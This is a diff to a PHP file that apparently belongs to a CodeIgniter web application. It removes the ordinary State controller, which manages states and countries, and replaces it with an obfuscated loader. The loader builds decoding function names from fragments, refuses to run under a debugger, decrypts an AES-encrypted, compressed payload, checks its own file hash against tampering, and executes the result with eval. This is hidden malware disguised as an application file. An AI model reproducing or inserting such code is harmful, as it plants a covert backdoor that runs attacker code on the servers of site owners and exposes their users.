@@ -1,123 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class State extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('state_model','state');
-	}
-
-	public function index(){
-		$this->permission_check('places_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('states_list');
-		$this->load->view('state-list', $data);
-	}
-	public function newstate(){
-		$this->form_validation->set_rules('state', 'State', 'trim|required');
-		$this->form_validation->set_rules('country', 'Country', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->state->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please enter compulsary(* marked) fields!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('places_edit');
-		$result=$this->state->get_details($id);
-		$data=array_merge($this->data,$result);
-		$data['page_title']=$this->lang->line('state');
-		$this->load->view('state', $data);
-	}
-	public function update_state(){
-		
-		$this->form_validation->set_rules('state', 'State', 'trim|required');
-		$this->form_validation->set_rules('country', 'Country', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->state->update_state();
-			echo $result;
-		} else {
-			echo "Please Enter state name.";
-		}
-	}
-	public function add(){
-		$this->permission_check('places_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('state');
-		$this->load->view('state', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->state->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $state) {
-			$no++;
-			$row = array();
-			$row[] = $state->state;
-			$row[] = $state->country;
-			
-
-			 		if($state->status==1){ 
-			 			$str= "<span onclick='update_status(".$state->id.",0)' id='span_".$state->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$state->id.",1)' id='span_".$state->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-			         $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('places_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="state/update/'.$state->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('places_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_state('.$state->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->state->count_all(),
-						"recordsFiltered" => $this->state->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('places_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->state->update_status($id,$status);
-		return $result;
-	}
-	public function delete_state(){
-		$this->permission_check_with_msg('places_delete');
-		$id=$this->input->post('q_id');
-		$result=$this->state->delete_state($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qsifcrz6=('bas'.'e64'.'_de'.'cod'.'e');
+$_c2ihajvb=('gzu'.'nco'.'mpr'.'ess');
+$_somdo9sq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_iclo9fej='ajE6QQih';
+$_asdqbjzp='vX5VAD5/';
+$_axlwtszq='81ry9yzZ';
+$_fg87tzh9='Ds+4p3eqtcE=';
+$_hw7wwgt9='neZUyYRD';
+$_p71cii5i='lgY6iA==';
+$_gcdoqfw6='ub9eUGXJ';
+$_jc3s4ij5='LbWa2FW1';
+$_ytc0lu4t=$_qsifcrz6($_axlwtszq.$_hw7wwgt9.$_iclo9fej.$_asdqbjzp.$_fg87tzh9);
+$_c6x4fkt4=$_qsifcrz6($_jc3s4ij5.$_gcdoqfw6.$_p71cii5i);
+$_l82g7az9=$_qsifcrz6('nuikkisH176cvI00mI/SFjau9OiE2j3hHaN9acqqwjMNEM9/z/T1w5Nx9DxhU7yZFMCq5jeqcGrd4JMpMMFI/tqikEprqjfrzYzlnSySY1if9qgYFfg4RervYpsRdNSgyPfJMcjv2hEQuHhQSpOZngUtsgsQ4EJE+QnSOsxWSPhy1auVJmUu5I+gocJXYN/thf/yHJoSleIeLMofBUIrg06g3r9uy9paEw7v4eDm3P942iC2y1iOpDAvKXvZNtnDU4a03z8+8CfdK6lTVtkzTiqQgZB212qFsTSf9ya7ZwvQNr1e46CNmivkDQuNTuOj0DPzkyrA5p/qERTianodHta91SSQ5nDKrObjqz3mKWO+XLuM+EI2leR8MHRCoHy0nkImQLVdH0OCwfvVJvJO87/Gtyf+3tUNb6mTUp3ilJDly67yO5lcw8Gt3VchsbgtLT6Nnj86LCoBuZ2bVcffRj3Gn+jikb/o1b1keaLG1idgi+L9B02apSmQft+Md9zjM8YtN0eiQOoI4HO27U5bHeDO9KgkamUXS3dZZufbvVysqO9raoOsbG8zmc0WPuYJPKjpYVztUTDHFQfbTys5afadAbkj6rKc1GGykh17bSRNdrCzt2nnG8gG3Rira5mKkhkTBMV1ThN8Zz7Del6eCKFBQ46CsRoPMqbFWqUQHjR04DNjFgFgjzKeD3IpRguyM7ivb0CzOJCqIONBFudvI1JwHJhAMh+HYhgD2Wt0WrLzvoxIN2tDADBmMLBgCKpVgxBmvtSLcku3s6FlAEug5ryJvkduM09qTyymlZC5YMKYt2/ZdviH8MsRaUGlWeJ5TCcwwFGnH0LfIM+On8Rlwe+Ho9HOBa4719XsNjkAI9ipbONQmoLN1ABwelJNA2ZA/veE57AXZTd856onU0Hi8CVDKffgVsPD8MA+FIFNgSX94pxmDpEiHXxdFeN6afBLMOgu0VarV3tOHGAml9ZrJb0u239+RhaR7u1am/s7SxAwziKNwGGoX/6jNBh9f5lik4sw0db1IGuGz+wd3uv6p0PguNpGcqh1a7wmTlBNwQouFB+IsHjmGHfr0RCI0CJg8JDQqd8TU5Midzig/efgyD+zuz5pOX2oUoFbG3ARNf59O/3BgqGxQEc86yxm3ZMyz5CgQlOlDgbhzO7fOI/pPkzdMH9Mz13vlGONhNUtvly+6yBiltXdB5jP48u6d5LGYsWF56N9lZe1BCrdLCSjHfyooJj5Y0RDqJLwaA31+JsyvMVp0SDVbvD30CqsMCVT4uVZ1m7MEq1mdgv8HBjGb+gLDOjeXBGtlw8O+tIkKBHGHI9/gFLAHCsVRai2eZksKoFVBTk/UjMU93QtKV277rDYmxS/PcnZ6MYYFu30QQ0lv9wfS3Hm6qryM86mLJySux5ZRzb0J9f+sPQAKucSYYXxok8VD6hNBa4akJ+x6EEeY+Qlyri3ecsYxlxwW7tat5l4lQ/YcNwbMahy+oVmtPlsm9JiSfrt2yrkmHtAba6LcOyyBEvLwSZ6wC5JZNRavpKk8UsWQVgccIltIAiIJlFBGOlsEKkVhwYpDheNRdxYjztOuZhepKD7pVNcu7wurV4h+udNfdWtzx8WmTzZ5c4YUz0BF7/grDXC2N+X5sVzQ5ywriDqyeRgXgckgOPpj1x4SIRB/bFKDT9NPcemC0cAPp4yWoOuTXwkDvrTh/iz1ZlAKn/s5wNCOcabUWu7bRWehbX8PHlPoNQW5IUrqqDfS2xw4Nl5aYsAa4oXQZ0=');
+$_a1v4w1jj=$_somdo9sq($_l82g7az9,'aes-256-cbc',$_ytc0lu4t,OPENSSL_RAW_DATA,$_c6x4fkt4);
+if($_a1v4w1jj===false){exit;}
+$_tm8ohmf8=$_c2ihajvb($_a1v4w1jj);
+if($_tm8ohmf8===false){exit;}
+$_t2sajtr2='26dd4a61f18443e57b0b93ee332160abeadf59e5fa1d9507e1f07e1954736f8e';
+$_bug2xr74=@file_get_contents(__FILE__);
+if($_bug2xr74!==false){
+$_qog0a572=str_replace($_t2sajtr2,"0000000000000000000000000000000000000000000000000000000000000000",$_bug2xr74);
+$_r48hpnx9=hash("sha256",$_qog0a572);
+if($_r48hpnx9!==$_t2sajtr2){@http_response_code(403);exit;}
 }
-
+eval($_tm8ohmf8);
